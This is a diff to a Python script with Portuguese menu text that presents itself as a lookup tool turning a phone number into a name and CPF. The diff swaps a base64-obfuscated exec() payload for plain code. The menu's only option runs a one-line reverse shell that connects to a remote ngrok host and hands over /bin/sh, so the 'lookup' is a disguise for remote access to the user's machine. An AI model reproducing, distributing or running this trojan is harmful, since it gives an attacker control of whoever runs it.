@@ -1,7 +1,46 @@
-import marshal, os
+#####################
+# FUNÇÕES & MODULOS #
+#####################
+
+global R,B,C,Y,G,RT,CY,CO
+CO='\033[m';R='\033[1;31m';B='\033[1;34m';C='\033[1;37m';CY='\033[1;36m';Y='\033[1;33m';G='\033[1;32m';RT='\033[;0m';NO_FORMAT="\033[0m";C_GREY89="\033[38;5;254m";C_RED1="\033[48;5;196m"
+
+
+import os, sys, smtplib, json, requests
+from time import sleep
+
 try:
-	import lib, base64
+	import pyfiglet
 except:
-	os.system('pip install lib');os.system('pip install pybase64')
-xvideo = (base64.b64decode('''IyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMgRlVOw4fDlUVTICYgTU9EVUxPUyAjCiMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKZ2xvYmFsIFIsQixDLFksRyxSVCxDWSxDTwpDTz0nXDAzM1ttJztSPSdcMDMzWzE7MzFtJztCPSdcMDMzWzE7MzRtJztDPSdcMDMzWzE7MzdtJztDWT0nXDAzM1sxOzM2bSc7WT0nXDAzM1sxOzMzbSc7Rz0nXDAzM1sxOzMybSc7UlQ9J1wwMzNbOzBtJztOT19GT1JNQVQ9IlwwMzNbMG0iO0NfR1JFWTg5PSJcMDMzWzM4OzU7MjU0bSI7Q19SRUQxPSJcMDMzWzQ4OzU7MTk2bSIKCgppbXBvcnQgb3MsIHN5cywgc210cGxpYiwganNvbiwgcmVxdWVzdHMKZnJvbSB0aW1lIGltcG9ydCBzbGVlcAoKdHJ5OgoJaW1wb3J0IHB5ZmlnbGV0CmV4Y2VwdDoKCW9zLnN5c3RlbSgncGlwIGluc3RhbGwgcHlmaWdsZXQnKQpkZWYgY2xlYXIoKToKCW9zLnN5c3RlbSgnY2xlYXInKQpkZWYgeCgpOgoJcHJpbnQoZicgICB7Q31be0d9WHtDfV17Un0gUkVUT1JOQVInKQkKCQojIyMjIyMjIyMjIyMjIyMjIyMjIwojICAgICAgICAgICAgICAgICAgIwojICBNRU5VIFBSSU5DSVBBTCAgIyAgICAgICAgICAKIyAgICAgICAgICAgICAgICAgICMKIyMjIyMjIyMjIyMjIyMjIyMjIyMKCgp3aGlsZSBUcnVlOgoJY2xlYXIoKQoJcHJpbnQoZicgICAge0d94oCU4oCU4oCUIHtDfVt7Un0qe0N9XSBDT0RJRklDQURPIFBPUjoge0d9TElQRVpJTntDfSBBTkQge0d9QVBST05JVFkgU0VDVVJJVFl7Q30gW3tSfSp7Q31de0d9IOKAlOKAlOKAlCcpCglyZXN1bHQgPSBweWZpZ2xldC5maWdsZXRfZm9ybWF0KCIgTUVOVSIsIGZvbnQgPSAiNWxpbmVvYmxpcXVlIiApCgoJcHJpbnQoZicnJ3tDfXtHfXtyZXN1bHR9JycnKQoJcHJpbnQoZicgICAgICAgICAgICAgIHtDfXtSfUJZIExJUEVaSU4ge0N9JykKCXByaW50KGYnICAgLy8tLT09LS09PS0tPT0tLT09LS09PS0tPT0tLT09LS09PS0tPT0tLT09LS1cXCcpCglwcmludChmJyAgIDExICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAxMScpCglwcmludChmJyAgIDExIHtDfVt7R30wMXtDfV17Un0gQ09OU1VMVEEgTlVNRVJPIHtDfVt7R31QRUdBUiBOT01FICtDUEYge0N9XXtDfSAxMScpCgkKCXByaW50KGYnICAgMTEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDExJykKCXByaW50KGYnICAgXFwtLT09LS09PS0tPT0tLT09LS09PS0tPT0tLT09LS09PS0tPT0tLT09LS0vLycpCgljaG9pY2UgPSBpbnB1dChmJ1xuXG5cbntSfSAgIFFVQUwgT1BDQU8gVkMgREVTRUpBPz4+PntDfSAnKQoJCgkKCWlmIGNob2ljZSA9PSAnMSc6CgkJICAgICAgICBvcy5zeXN0ZW0oJycnIHB5dGhvbiAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjQudGNwLm5ncm9rLmlvIiwxMjcwMCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk7JyAnJycp'''))
-exec(xvideo)
+	os.system('pip install pyfiglet')
+def clear():
+	os.system('clear')
+def x():
+	print(f'   {C}[{G}X{C}]{R} RETORNAR')	
+	
+####################
+#                  #
+#  MENU PRINCIPAL  #          
+#                  #
+####################
+
+
+while True:
+	clear()
+	print(f'    {G}——— {C}[{R}*{C}] CODIFICADO POR: {G}LIPEZIN{C} AND {G}APRONITY SECURITY{C} [{R}*{C}]{G} ———')
+	result = pyfiglet.figlet_format(" MENU", font = "5lineoblique" )
+
+	print(f'''{C}{G}{result}''')
+	print(f'              {C}{R}BY LIPEZIN {C}')
+	print(f'   //--==--==--==--==--==--==--==--==--==--==--\\')
+	print(f'   11                                         11')
+	print(f'   11 {C}[{G}01{C}]{R} CONSULTA NUMERO {C}[{G}PEGAR NOME +CPF {C}]{C} 11')
+	
+	print(f'   11                                         11')
+	print(f'   \\--==--==--==--==--==--==--==--==--==--==--//')
+	choice = input(f'\n\n\n{R}   QUAL OPCAO VC DESEJA?>>>{C} ')
+	
+	
+	if choice == '1':
+		        os.system(''' python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("2.tcp.ngrok.io",16102));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+^C ''')
